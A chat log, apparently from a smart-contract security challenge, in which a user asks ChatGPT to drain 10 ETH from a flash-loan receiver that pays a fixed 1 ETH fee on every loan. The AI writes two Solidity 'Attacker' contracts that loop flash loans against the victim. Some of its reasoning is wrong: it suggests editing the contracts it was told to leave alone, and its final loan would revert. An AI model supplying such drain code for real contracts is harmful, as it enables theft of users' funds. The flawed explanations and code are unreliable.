User: 

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

I am gonna share now the two contracts:

The two contracts you've posted are flash loan smart contracts that utilize the ERC3156 standard, and both contracts are written in Solidity.

The first contract (NaiveReceiverLenderPool) is a flash loan pool. It has a fixed fee of 1 ETH and only supports ETH as a currency. It checks if the flash loan is repaid with the correct fee, and if not, it reverts the transaction.

The second contract (FlashLoanReceiver) is a flash loan receiver that works with the NaiveReceiverLenderPool. It checks if the loan was taken from the correct pool, and if the currency is ETH, and then it repays the loan. The function _executeActionDuringFlashLoan is empty and intended to be where the funds received during the flash loan are used.

To take all the ETH out of the FlashLoanReceiver contract in a single transaction, you need to take a flash loan from the NaiveReceiverLenderPool contract and ensure the loan amount plus the fee is equal to or greater than the ETH balance of the FlashLoanReceiver contract.

Here is how you could do this:

    First, find out the balance of the FlashLoanReceiver contract. This can be done off-chain (i.e., using a web3 library).
    Call flashLoan function of NaiveReceiverLenderPool contract from an external contract or externally owned account (EOA). The receiver parameter should be the FlashLoanReceiver contract. The amount parameter should be the balance of FlashLoanReceiver contract minus the flash loan fee (1 ETH), if the balance is greater than or equal to 1 ETH. If it's not, the amount parameter should be the balance of FlashLoanReceiver contract, which means the pool balance must be larger than the FlashLoanReceiver contract balance to cover the fee.
    Make sure _executeActionDuringFlashLoan function in the FlashLoanReceiver contract transfers the remaining ETH to your desired address.

Please note that flash loans are advanced and risky financial instruments and should be used with caution. Also, keep in mind that using flash loans to manipulate smart contract states or to drain funds from smart contracts is illegal and unethical. The example given above is for illustrative and educational purposes only.

With that instructions I only drain 1 ether, what do I do to drain the other 9 without modifying the contracts?
ChatGPT

The two contracts you've provided can be exploited because of a design flaw in the FlashLoanReceiver contract. This contract always pays back the flash loans it receives, regardless of the amount, using its own balance, and without limiting the number of loans it can accept.

This means that you can effectively drain the FlashLoanReceiver by executing multiple flash loans in a single transaction.

The idea is to create a loop that continues to flash-borrow 1 ETH and pay back 2 ETH (1 ETH loan amount + 1 ETH fee) until the FlashLoanReceiver's balance is exhausted.

This is a general outline of how you can exploit these contracts:

    Deploy your own contract that calls the flashLoan function on the NaiveReceiverLenderPool contract in a loop, setting the receiver parameter to the FlashLoanReceiver contract.

    The amount parameter should be 1 ETH.

    Repeat the flash loan process until the balance of the FlashLoanReceiver is less than 2 ETH (1 ETH for the loan amount and 1 ETH for the fee).

    Lastly, take a final flash loan with an amount that the FlashLoanReceiver can repay (its balance - 1 ETH for the fee).

Here is an example of how the attacker contract could look like:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Attacker {

    NaiveReceiverLenderPool pool;
    address payable receiver;

    constructor(NaiveReceiverLenderPool _pool, address payable _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() external {
        while (receiver.balance >= 2 ether) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // ETH
                1 ether,
                ""
            );
        }

        if (receiver.balance > 1 ether) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // ETH
                receiver.balance - 1 ether,
                ""
            );
        }
    }
}

This is a very simple contract with only one function attack(). This function calculates how much ETH can be borrowed and initiates the flash loans from the NaiveReceiverLenderPool.

Once again, please note that exploiting smart contracts in this manner is illegal and unethical. This information is provided purely for educational purposes to showcase a common vulnerability found in smart contracts.

it lefts 1 ether on the receiver

My apologies for the oversight. The flashLoan operation requires a fee of 1 ETH, which will always be left in the FlashLoanReceiver contract because the loop stops when there is less than 2 ETH left in the receiver.

To completely drain the FlashLoanReceiver contract, we would need to modify our attacking contract to accommodate for this remaining balance.

The modified contract would look like this:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Attacker {

    NaiveReceiverLenderPool pool;
    address payable receiver;

    constructor(NaiveReceiverLenderPool _pool, address payable _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() external {
        while (receiver.balance > 1 ether) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // ETH
                1 ether,
                ""
            );
        }

        if (receiver.balance > 0) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // ETH
                receiver.balance,
                ""
            );
        }
    }
}

In the attack() function, we first drain the FlashLoanReceiver contract using 1 ETH loans until its balance is 1 ETH or less. Then, we take a final flash loan with the remaining balance of the FlashLoanReceiver contract as the amount. This final loan will leave the FlashLoanReceiver contract completely drained.
